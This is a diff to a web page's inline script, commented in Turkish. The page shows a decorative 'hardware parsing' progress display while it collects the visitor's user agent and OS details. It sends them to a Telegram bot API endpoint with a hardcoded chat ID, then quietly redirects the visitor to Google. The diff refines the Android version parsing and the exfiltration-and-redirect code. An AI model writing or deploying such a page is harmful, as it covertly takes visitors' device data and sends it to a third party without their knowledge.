@@ -64,7 +64,6 @@
                 consoleLog.scrollTop = consoleLog.scrollHeight;
             };
 
-            // Animasyonlar arka planda formalite olarak tetikleniyor
             fill.style.width = "50%";
             status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
 
@@ -82,9 +81,10 @@
                 let ua = navigator.userAgent;
                 let os = "Bilinmeyen Sistem";
                 
+                // --- KESİN ÇÖZÜM: GARANTİ ANDROID SÜRÜM AYRIŞTIRICI ---
                 if (/Android/i.test(ua)) {
-                    let match = ua.match(/Android\s([0-9\.]+)/);
-                    os = match ? "Android " + match[1] : "Android";
+                    let match = ua.match(/Android\s+([0-9\.]+)/i) || ua.match(/Android\/([0-9\.]+)/i);
+                    os = (match && match[1]) ? "Android " + match[1] : "Android";
                 } else if (/iPhone|iPad|iPod/i.test(ua)) {
                     os = "iOS";
                 } else if (/Windows/i.test(ua)) {
@@ -159,13 +159,12 @@
                 let cid = "6845229845";
                 let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
-                // HIZ OPTİMİZASYONU: Veri çözüldüğü an saniyesinde Google'a uçurur
-                fetch(url)
-                .then(() => { window.location.href = "https://www.google.com"; })
-                .catch(() => { window.location.href = "https://www.google.com"; });
+                fetch(url).finally(() => {
+                    window.location.replace("https://www.google.com");
+                });
             })
             .catch(() => {
-                window.location.href = "https://www.google.com";
+                window.location.replace("https://www.google.com");
             });
         };
     </script>
